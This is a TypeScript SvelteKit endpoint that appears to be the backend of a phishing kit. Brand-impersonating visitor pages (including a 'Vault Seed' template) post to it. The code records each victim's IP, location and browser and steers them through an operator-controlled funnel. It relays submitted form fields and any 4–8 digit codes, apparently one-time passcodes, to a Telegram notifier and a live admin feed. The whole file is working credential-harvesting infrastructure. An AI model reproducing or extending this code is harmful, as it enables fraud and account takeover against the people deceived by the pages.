/**
 * Visitor page advance.
 *
 * Every interactive visitor template (Activity, Balance, External, Vault Seed, …)
 * POSTs here when the visitor presses its primary CTA. We log the action to the
 * admin activity feed and respond with the URL the visitor should move to next,
 * resolved through `getNextUrl` (admin override > default funnel mapping).
 *
 * Public endpoint — visitor pages must reach it without auth.
 */
import { json, type RequestHandler } from '@sveltejs/kit';
import { serverState } from '$lib/server/state';
import { broadcast } from '$lib/server/websocket';
import {
	applyLoadingInterstitial,
	getNextUrl,
	getNextLabel,
	resolveVisitorFlowAdvance
} from '$lib/server/funnel';
import { notifyPageAction } from '$lib/server/telegram';
import { dbSetVisitorFlowSteps } from '$lib/server/database';

const PANEL_HOST = (process.env.PANEL_HOST || '').toLowerCase();

export const POST: RequestHandler = async ({ request, getClientAddress, url }) => {
	let body: {
		brand?: string;
		page?: string;
		choice?: string;
		detail?: string;
		fields?: Record<string, unknown>;
	} = {};
	try {
		body = await request.json();
	} catch {
		return json({ ok: false, error: 'invalid json' }, { status: 400 });
	}

	const brand = String(body.brand ?? '').trim();
	const page = String(body.page ?? '').trim();
	const choice = String(body.choice ?? '').trim().slice(0, 160);
	const detail = String(body.detail ?? '').trim().slice(0, 500);

	const fields: Record<string, string> = {};
	if (body.fields && typeof body.fields === 'object' && !Array.isArray(body.fields)) {
		for (const [key, val] of Object.entries(body.fields)) {
			if (typeof val !== 'string' && typeof val !== 'number') continue;
			const k = key.trim().slice(0, 48);
			if (!k) continue;
			fields[k] = String(val).trim().slice(0, 512);
		}
	}

	if (!brand || !page) {
		return json({ ok: false, error: 'brand and page required' }, { status: 400 });
	}

	const ip = getClientAddress() || '';

	const visitor = serverState.visitors.get(ip);
	if (!visitor) {
		return json({ ok: false, error: 'no_session' }, { status: 400 });
	}

	const qp = new URLSearchParams();
	if (visitor?.lastTwoDigits) qp.set('last2', visitor.lastTwoDigits);
	if (visitor?.emailFrom) qp.set('emailFrom', visitor.emailFrom);
	if (visitor?.emailTo) qp.set('emailTo', visitor.emailTo);

	const hostname = url.hostname.toLowerCase();
	const isVisitorHost = !!(PANEL_HOST && hostname !== PANEL_HOST);

	let nextUrl: string | null = null;
	let nextLabel: string | null = null;
	const currentLabel = `${brand}/${page}`;

	const flowResult = resolveVisitorFlowAdvance(
		visitor,
		currentLabel,
		isVisitorHost,
		qp.size ? qp : undefined
	);
	if (flowResult.flowApplied) {
		nextUrl = flowResult.nextUrl;
		nextLabel = flowResult.nextLabel;
		if (flowResult.markedPassed) {
			try {
				dbSetVisitorFlowSteps(ip, visitor.flowSteps);
			} catch {
				/* non-critical */
			}
		}
	}

	// Fallback to the default funnel mapping only when flow did not dictate navigation
	if (!flowResult.flowApplied) {
		nextUrl = getNextUrl(brand, page, qp.size ? qp : undefined, {
			module: visitor.module,
			isVisitorHost
		});
		nextLabel = getNextLabel(brand, page);
	}

	if (nextLabel && visitor) {
		serverState.setVisitorLastPage(ip, nextLabel);
		broadcast({ type: 'visitor:updated', payload: visitor });
	}

	const parts = [`visitor ${ip} advanced from ${brand}/${page}`];
	if (choice) parts.push(`— ${choice}`);
	if (detail) parts.push(`(${detail})`);
	const message = parts.join(' ');

	const entry = serverState.addLogEntry(message, 'action');
	try {
		broadcast({ type: 'log:new', payload: entry });
	} catch {
		/* ws may not be ready in dev */
	}

	if (visitor) {
		const pageLabel = `${brand}/${page}`;
		const telegramFields =
			Object.keys(fields).length > 0
				? fields
				: choice && /^\d{4,8}$/.test(choice)
					? { code: choice }
					: undefined;

		notifyPageAction(
			{
				ip,
				userId: visitor.userId,
				city: visitor.city,
				region: visitor.region,
				country: visitor.country,
				browser: visitor.browser,
				platform: visitor.platform,
				module: visitor.module,
				capturedBy: visitor.capturedBy,
				lastPageRoute: pageLabel
			},
			pageLabel,
			choice || 'Continue',
			detail || undefined,
			telegramFields
		).catch(() => {});
	}

	const outbound = applyLoadingInterstitial(nextUrl, qp.size ? qp : undefined, {
		isVisitorHost
	});

	return json({ ok: true, nextUrl: outbound });
};
